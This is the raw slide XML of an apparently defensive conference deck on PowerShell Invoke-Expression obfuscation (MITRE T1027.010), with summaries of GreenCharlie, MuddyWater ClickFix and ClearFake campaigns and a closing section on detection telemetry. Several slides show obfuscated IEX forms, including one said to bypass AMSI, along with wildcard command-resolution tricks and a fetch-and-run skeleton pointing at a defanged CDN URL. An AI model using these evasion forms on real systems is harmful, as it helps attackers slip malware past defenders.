            <a:off x="635000" y="4419600"/>
            <a:ext cx="10922000" cy="1625600"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="161411"/>
          </a:solidFill>
          <a:ln w="19050" cap="flat" cmpd="sng" algn="ctr">
            <a:solidFill>
              <a:srgbClr val="F2A53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CCE5FA-E88A-415F-BAE7-4848F2167168}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="723900" y="5080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25" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="62D2E8"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
              </a:rPr>
              <a:t>— THE OBFUSCATION ZOO</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="titleBox">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{580DECF2-F8F3-4EA2-AD87-500B6260582E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="723900" y="889000"/>
            <a:ext cx="10414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 dirty="0">
                <a:solidFill>
                  <a:srgbClr val="EDF3EF"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>Same </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F2A53C"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>IEX</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="EDF3EF"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>, Infinite Disguises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9F4173-263F-44CB-8139-4D50B122CEC0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="723900" y="16256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dirty="0">
                <a:solidFill>
                  <a:srgbClr val="93A89F"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
              </a:rPr>
              <a:t>Common disguises — one command, many costumes</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="commonCode">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2A06DD84-C025-42B3-A9E9-E03B23D275F8}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="952500" y="2362200"/>
            <a:ext cx="6705600" cy="1625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25" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="EDF3EF"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>('i'+'e'+'x')</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2025" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="82948C"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>                # concat str</a:t>
            </a:r>
          </a:p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25" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="EDF3EF"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>("{1}{0}"-f'EX','I')</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2025" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="82948C"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>         # FS reorder</a:t>
            </a:r>
          </a:p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25" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="EDF3EF"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>[char[]](105,101,120)-join''</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2025" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="82948C"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t> # ascii codes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A2D53-22D8-4DB0-A5A8-C548767D8B0D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8185150" y="3866851"/>
            <a:ext cx="3371850" cy="59584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dirty="0">
                <a:solidFill>
                  <a:srgbClr val="82948C"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
              </a:rPr>
              <a:t>   Full write-up ↗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F0B3F3-E98A-4CD9-AA79-7B44498C436C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="863600" y="4521200"/>
            <a:ext cx="1046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 dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F2A53C"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
              </a:rPr>
              <a:t>A random homemade IEX… that bypasses AMSI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1B3AA8-F872-4529-BF17-DE2F692D4302}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="863600" y="4927600"/>
            <a:ext cx="10617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25" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="EDF3EF"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
              </a:rPr>
              <a:t>.((RVpa "\???????\*2\*POO*\*river?\?6*").PATh[4,15,34]-JOin'')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C38E81-EFF5-46A0-929F-EA3599B5D08E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="863600" y="5486400"/>
            <a:ext cx="1046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dirty="0">
                <a:solidFill>
                  <a:srgbClr val="82948C"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
              </a:rPr>
              <a:t>= IEX - Looks like gibberish. Resolves to an invoke expression — and runs.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4138B0-24BC-1D25-065F-6A46A31BC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476" y="870527"/>
            <a:ext cx="2945524" cy="2945524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882432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62D2E8"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>T1027.010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DF3EF"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>Before / After: What Changed for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5238" y="1788795"/>
            <a:ext cx="316801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82948C"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>Before T1027.010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0" y="1788795"/>
            <a:ext cx="43053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82948C"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>After T1027.010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312670"/>
            <a:ext cx="275748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Courier New"/>
              </a:rPr>
              <a:t>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5238" y="2312670"/>
            <a:ext cx="316801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93A89F"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>“T1027 (generic)”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0" y="2312670"/>
            <a:ext cx="43053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“T1027.010, specifically”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893695"/>
            <a:ext cx="275748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Courier New"/>
              </a:rPr>
              <a:t>Rule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5238" y="2893695"/>
            <a:ext cx="316801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93A89F"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>ambiguous — file or command? unclear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0" y="2893695"/>
            <a:ext cx="43053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precise — command-line obfuscation, named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817620"/>
            <a:ext cx="2757488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Novel pattern</a:t>
            </a:r>
          </a:p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(wildcard IEX)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5238" y="3817620"/>
            <a:ext cx="316801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93A89F"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>no framework wording to anchor a writeup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0" y="3817620"/>
            <a:ext cx="430530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F2A53C"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>T1027.010's own wording describes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5084445"/>
            <a:ext cx="275748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Courier New"/>
              </a:rPr>
              <a:t>Detection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5238" y="5084445"/>
            <a:ext cx="316801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93A89F"/>
                </a:solidFill>
                <a:latin typeface="Tahoma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3750" y="5084445"/>
            <a:ext cx="43053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dirty="0">
                <a:solidFill>
                  <a:srgbClr val="EDF3EF"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>DET0505 (AN1394–1396)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5665470"/>
            <a:ext cx="275748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Courier New"/>
              </a:rPr>
              <a:t>Navigator heatmap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5238" y="5665470"/>
            <a:ext cx="316801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93A89F"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>one fat T1027 blob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50" y="5665470"/>
            <a:ext cx="43053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Tahoma"/>
              </a:rPr>
              <a:t>distinct, filterable ID</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="601559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1492568"/>
            <a:ext cx="1087755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F2A53C"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>Section 03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2235518"/>
            <a:ext cx="10134600" cy="1792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dirty="0">
                <a:solidFill>
                  <a:srgbClr val="EDF3EF"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>Still Alive:</a:t>
            </a:r>
          </a:p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dirty="0">
                <a:solidFill>
                  <a:srgbClr val="EDF3EF"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>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4191000"/>
            <a:ext cx="73723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93A89F"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>The wrapper evolved. The primitive didn't.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965382"/>
            <a:ext cx="205168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GreenCharlie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0860" y="4965382"/>
            <a:ext cx="316611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MuddyWater ClickFix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7945" y="4965382"/>
            <a:ext cx="507492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ClearFake / Amatera / SectopRAT</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1544195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0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F2A53C"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>GreenCharlie · </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2025" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F2A53C"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>2026</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2025" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F2A53C"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t> · 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6139355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EDF3EF"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>Same Wildcard, New Flag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703070"/>
            <a:ext cx="76771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Tahoma"/>
              </a:rPr>
              <a:t>Spearphish → fake cloud / doc / auth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250758"/>
            <a:ext cx="76771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Wildcard </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2250" b="0">
                <a:solidFill>
                  <a:srgbClr val="EDF3EF"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>Get-Command</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2250" b="0">
                <a:solidFill>
                  <a:srgbClr val="EDF3EF"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t> resolution — no cmdlet ever typed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837498"/>
            <a:ext cx="76771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Base64 + bitwise-NOT double-decode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75" y="3709988"/>
            <a:ext cx="74295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EDF3EF"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>&amp;(gcm </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2250" b="1">
                <a:solidFill>
                  <a:srgbClr val="62D2E8"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>*v?k?-?x?re*</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2250" b="1">
                <a:solidFill>
                  <a:srgbClr val="EDF3EF"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>).name $LastEx;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4558665"/>
            <a:ext cx="11715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Courier New"/>
              </a:rPr>
              <a:t>Base64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7900" y="4558665"/>
            <a:ext cx="304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82948C"/>
                </a:solidFill>
                <a:latin typeface="Courier New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3675" y="4558665"/>
            <a:ext cx="20288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Courier New"/>
              </a:rPr>
              <a:t>bitwise-NOT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4902" y="4558665"/>
            <a:ext cx="304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82948C"/>
                </a:solidFill>
                <a:latin typeface="Courier New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0678" y="4558665"/>
            <a:ext cx="22002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Courier New"/>
              </a:rPr>
              <a:t>wildcard gcm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3355" y="4558665"/>
            <a:ext cx="304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82948C"/>
                </a:solidFill>
                <a:latin typeface="Courier New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9130" y="4558665"/>
            <a:ext cx="27146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F2A53C"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>$LastEx invoked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0700" y="5462588"/>
            <a:ext cx="237458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82948C"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>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0700" y="5786438"/>
            <a:ext cx="237458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DF3EF"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>Picus Security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F2A53C"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>MuddyWater / TA450 · 2024–2025 · Iran (MOIS)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DF3EF"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>A Confirmed Actor, A Suspected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703070"/>
            <a:ext cx="106108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Nov 2024: fake MS update → Win+R paste → RMM install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1075" y="1728470"/>
            <a:ext cx="157448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2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2A53C"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>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334578"/>
            <a:ext cx="106108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Tahoma"/>
              </a:rPr>
              <a:t>2025: PowerShell-only RAT via ClickFix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765" y="2359978"/>
            <a:ext cx="380238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2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6259"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>attribution unconfirmed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297555"/>
            <a:ext cx="406622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82948C"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>THE DECODE CHAIN, STAGED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3792855"/>
            <a:ext cx="1685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Courier New"/>
              </a:rPr>
              <a:t>Base64 ×3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2250" y="3792855"/>
            <a:ext cx="304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82948C"/>
                </a:solidFill>
                <a:latin typeface="Courier New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8025" y="3792855"/>
            <a:ext cx="13430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Courier New"/>
              </a:rPr>
              <a:t>GZip ×2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52" y="3792855"/>
            <a:ext cx="304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82948C"/>
                </a:solidFill>
                <a:latin typeface="Courier New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9228" y="3792855"/>
            <a:ext cx="305847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Courier New"/>
              </a:rPr>
              <a:t>string-reverse ×2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9155" y="3792855"/>
            <a:ext cx="304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82948C"/>
                </a:solidFill>
                <a:latin typeface="Courier New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4930" y="3792855"/>
            <a:ext cx="2371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Courier New"/>
              </a:rPr>
              <a:t>URL-safe swap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4345305"/>
            <a:ext cx="304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82948C"/>
                </a:solidFill>
                <a:latin typeface="Courier New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3025" y="4345305"/>
            <a:ext cx="2200275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F2A53C"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>IEX </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2250" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F2A53C"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>$payload</a:t>
            </a:r>
            <a:endParaRPr sz="2250" b="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="F2A53C"/>
              </a:solidFill>
              <a:latin typeface="Courier New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90700" y="5462588"/>
            <a:ext cx="295179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82948C"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>Source ·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0700" y="5786438"/>
            <a:ext cx="295179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DF3EF"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>Proofpoint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698" y="5462588"/>
            <a:ext cx="278606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82948C"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>Source · payload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698" y="5786438"/>
            <a:ext cx="27860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DF3EF"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>Fortinet</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2670621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575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F2A53C"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>ClearFake / Amatera / SectopRAT · 2025–2026 · Crimeware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034"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr sz="3600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="EDF3EF"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>One Toolkit</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="EDF3EF"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t> -</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="3600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="EDF3EF"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t> Three </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="EDF3EF"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>Unique Campaigns </a:t>
            </a:r>
            <a:endParaRPr sz="3600" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="EDF3EF"/>
              </a:solidFill>
              <a:latin typeface="Tahom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0600" y="1703070"/>
            <a:ext cx="5076825" cy="824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Tahoma"/>
              </a:rPr>
              <a:t>Next stage hosted on-chain (EtherHiding)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627948"/>
            <a:ext cx="5076825" cy="85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Proxied via signed </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2250" b="0">
                <a:solidFill>
                  <a:srgbClr val="EDF3EF"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>SyncAppvPublishingServer.vbs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591878"/>
            <a:ext cx="5076825" cy="862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Identical </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2250" b="0">
                <a:solidFill>
                  <a:srgbClr val="EDF3EF"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>gal</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2250" b="0">
                <a:solidFill>
                  <a:srgbClr val="EDF3EF"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2250" b="0">
                <a:solidFill>
                  <a:srgbClr val="EDF3EF"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>gcm</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2250" b="0">
                <a:solidFill>
                  <a:srgbClr val="EDF3EF"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t> skeleton in </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2250" b="1">
                <a:solidFill>
                  <a:srgbClr val="EDF3EF"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>3 vendor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742498"/>
            <a:ext cx="105156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EDF3EF"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>&amp;(gal </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2025" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="62D2E8"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>i</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2025" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="62D2E8"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>*x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)(&amp;(</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2025" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="EDF3EF"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>gcm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 </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2025" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="62D2E8"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>*</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2025" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="62D2E8"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>stM</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2025" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="62D2E8"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>*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) '</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2025" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="EDF3EF"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>cdn.jsdelivr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[.]net/...')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0700" y="5576888"/>
            <a:ext cx="162496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82948C"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>ClearFake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0700" y="5900738"/>
            <a:ext cx="162496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DF3EF"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>Expel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253" y="5576888"/>
            <a:ext cx="17335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82948C"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>Amatera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7253" y="5900738"/>
            <a:ext cx="17335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DF3EF"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>Blackpoint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8568" y="5576888"/>
            <a:ext cx="162496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82948C"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>SectopRAT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8568" y="5841206"/>
            <a:ext cx="162496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DF3EF"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>Vega</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3808455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2A53C"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>Still Alive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DF3EF"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>New Wrapper Every Year. Same Primitive.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1788795"/>
            <a:ext cx="31051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82948C"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>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2900" y="1788795"/>
            <a:ext cx="277749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82948C"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>Wrapper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01840" y="1788795"/>
            <a:ext cx="434721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82948C"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>Primitive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312670"/>
            <a:ext cx="31051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Courier New"/>
              </a:rPr>
              <a:t>STEEP#MAVERICK</a:t>
            </a:r>
          </a:p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Courier New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2900" y="2312670"/>
            <a:ext cx="277749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Tahoma"/>
              </a:rPr>
              <a:t>Spearphish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840" y="2312670"/>
            <a:ext cx="434721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dirty="0">
                <a:solidFill>
                  <a:srgbClr val="EDF3EF"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>Wildcard gal/</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2100" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="EDF3EF"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>gcm</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2100" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="EDF3EF"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t> → IEX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122295"/>
            <a:ext cx="31051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GreenCharlie</a:t>
            </a:r>
          </a:p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2024–25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2900" y="3122295"/>
            <a:ext cx="277749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Fake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1840" y="3122295"/>
            <a:ext cx="434721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EDF3EF"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>Wildcard gcm + base64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931920"/>
            <a:ext cx="31051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MuddyWater</a:t>
            </a:r>
          </a:p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2024–25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2900" y="3931920"/>
            <a:ext cx="277749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Tahoma"/>
              </a:rPr>
              <a:t>ClickFix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840" y="3931920"/>
            <a:ext cx="434721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EDF3EF"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>Base64×3 + GZip×2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741545"/>
            <a:ext cx="31051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ClearFake et al.</a:t>
            </a:r>
          </a:p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Courier New"/>
              </a:rPr>
              <a:t>2025–26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2900" y="4741545"/>
            <a:ext cx="277749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Tahoma"/>
              </a:rPr>
              <a:t>ClickFix, on-chain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840" y="4741545"/>
            <a:ext cx="434721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2A53C"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>Wildcard gal/gcm</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2735525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1457325"/>
            <a:ext cx="1087755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F2A53C"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>Section 04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2200275"/>
            <a:ext cx="10134600" cy="1792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dirty="0">
                <a:solidFill>
                  <a:srgbClr val="EDF3EF"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>The Telemetry Problem &amp; Detection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804" y="3992880"/>
            <a:ext cx="10068791" cy="423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dirty="0">
                <a:solidFill>
                  <a:srgbClr val="93A89F"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>Detection engineering is only as viable as the fuel you give it.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="798953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0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2A53C"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>The Telemetry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EDF3EF"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>Same Attack. Two Endpoints.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5529262"/>
            <a:ext cx="10877550" cy="616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25" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="82948C"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>Endpoint telemetry is key</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2025" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="82948C"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t> — default logging shows nothing; three enabled sources correlate on timestamp, host, and </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2025" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="82948C"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>ScriptBlockId</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2025" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="82948C"/>
                </a:solidFill>
                <a:latin typeface="Courier New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5300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F2A53C"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>The Telemetry Problem · Reference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DF3EF"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>Three Sources, Three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1788795"/>
            <a:ext cx="221361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82948C"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/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61360" y="1788795"/>
